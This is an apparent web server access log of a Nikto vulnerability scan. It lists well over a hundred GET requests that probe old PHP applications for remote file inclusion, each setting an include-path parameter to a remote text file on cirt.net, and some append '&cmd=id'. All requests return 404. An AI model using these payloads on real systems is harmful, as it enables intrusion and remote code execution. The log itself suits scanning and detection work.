172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mep/frame.php?chem=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005329)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /microcms/includes/file_manager/special.php?fm_includes_special=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005330)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /middle.php?file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005331)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /migrateNE2toNE3.php?_NE[AbsPath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005332)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mindmeld/acweb/admin_index.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005333)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mindmeld/include/ask.inc.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005334)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mindmeld/include/learn.inc.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005335)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mindmeld/include/manage.inc.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005336)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mindmeld/include/mind.inc.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005337)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mindmeld/include/sensory.inc.php?MM_GLOBALS[home]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005338)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mini-pub.php/front-end/img.php?sFileName=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005339)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /minimal/wiki.php?page=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005340)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /misc/function.php3?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005341)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mitglieder.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005342)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mkportal/include/user.php?MK_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005343)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mkportal/include/user.php?MK_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005344)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod/authent.php4?rootpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005345)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod/image/index.php?config[pathMod]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005346)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod/liens/index.php?config[pathMod]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005347)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod/liste/index.php?config[pathMod]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005348)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod/special/index.php?config[pathMod]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005349)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod/texte/index.php?config[pathMod]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005350)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod_membre/inscription.php?chemin=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005351)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mod_phpalbum/sommaire_admin.php?chemin=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005352)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modernbill/include/html/config.php?DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005353)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modifyform.html?code=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005354)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mods/business_functions.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005355)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mods/config/load.inc.php?moddir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005356)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mods/http/load.inc.php?moddir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005357)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /mods/ui_functions.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005358)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /module/forum/forum.php?fd=http://cirt.net/rfiinc.txt?='; HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005359)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /module/forum/main.php?id=1&main_dir=http://cirt.net/rfiinc.txt??& HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005360)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules.php?Nikto=http://cirt.net/rfiinc.txt?&file=article&sid=2 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005361)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules.php?name=http://cirt.net/rfiinc.txt?&file=article&sid=2 HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005361)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/4nAlbum/public/displayCategory.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005362)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005363)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Calendar/admin/update.php?calpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005364)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Calendar/calendar.php?calpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005365)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Calendar/scheme.php?calpath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005366)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Discipline/CategoryBreakdownTime.php?FocusPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005367)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Discipline/CategoryBreakdownTime.php?staticpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005368)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Discipline/StudentFieldBreakdown.php?staticpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005369)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Forums/admin/admin_styles.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005370)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/MusooTemplateLite.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005371)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/My_eGallery/index.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005372)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/My_eGallery/public/displayCategory.php?basepath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 537 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005373)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/Mysqlfinder/MysqlfinderAdmin.php?_SESSION[PATH_COMPOSANT]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005374)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/NukeAI/util.php?AIbasedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005375)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005376)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005377)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/abook/foldertree.php?baseDir==http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005378)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/addons/plugin.php?doc_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005379)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/admin/include/config.php?doc_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005380)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/admin/include/localize.php?doc_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005381)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/agendax/addevent.inc.php?agendax_path=http://cirt.net/rfiinc.txt?&cmd=id HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005382)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/bank/includes/design/main.inc.php?bank_data[root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005383)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/bank/includes/design/main.inc.php?bank_data[root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005384)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/basicfog/basicfogfactory.class.php?PATH_TO_CODE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005385)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/birstday/birst.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005386)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/birstday/profile_show.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005387)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/birstday/select.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005388)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/blocks/headerfile.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005389)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/calendar/index.php?inc_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005390)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/calendar/minicalendar.php?GLOBALS[rootdp]=./&GLOBALS[gsLanguage]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005391)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/calendar/mod_calendar.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005392)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/calendar/mod_calendar.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005393)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/certinfo/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005394)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/character_roster/include.php?mod_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005395)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005396)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 547 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005397)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/coppermine/themes/default/theme.php?THEME_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005398)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/downloads/lib/LM_Downloads.php?pathToIndex=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005399)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/dungeon/tick/allincludefortick.php?PATH_TO_CODE=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005400)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/emails/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005401)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/events/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005402)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/fax/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005403)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/files/blocks/latest_files.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005404)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/files/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005405)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/files/list.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005406)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/filters/headerfile.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005407)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/formmailer/formmailer.admin.inc.php?BASE_DIR[jax_formmailer]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005408)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/forums/blocks/latest_posts.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005409)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/global/inc/content.inc.php?sIncPath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005410)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/groupadm/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005411)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/groups/headerfile.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005412)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/guestbook/index.php?CONFIG[local_root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005413)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/history/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005414)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/home.module.php?repmod=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005415)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/horoscope/footer.php?xoopsConfig[root_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005416)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/icontent/include/wysiwyg/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 546 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005417)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/info/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005418)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/links/blocks/links.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005419)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/links/showlinks.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005420)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/links/submit_links.php?rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005421)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/log/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005422)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mail/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005423)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/menu/headerfile.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005424)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/messages/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005425)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005426)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005427)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_calendar.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005428)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_flatmenu.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005429)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_mainmenu.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005430)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_weather.php?absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005431)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mod_weather.php?absolute_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005432)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005433)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005434)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/newbb_plus/config.php?bbPath[root_theme]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005435)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/newbb_plus/votepolls.php?bbPath[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005436)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/news/blocks/latest_news.php?system[path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005437)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/newusergreatings/pm_newreg.php?exbb[home_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005438)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/organizations/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005439)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/phones/index.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005440)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/pms/index.php?module_path=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005441)"
172.17.0.1 - - [12/Feb/2019:08:08:32 +0000] "GET /modules/poll/inlinepoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005442)"
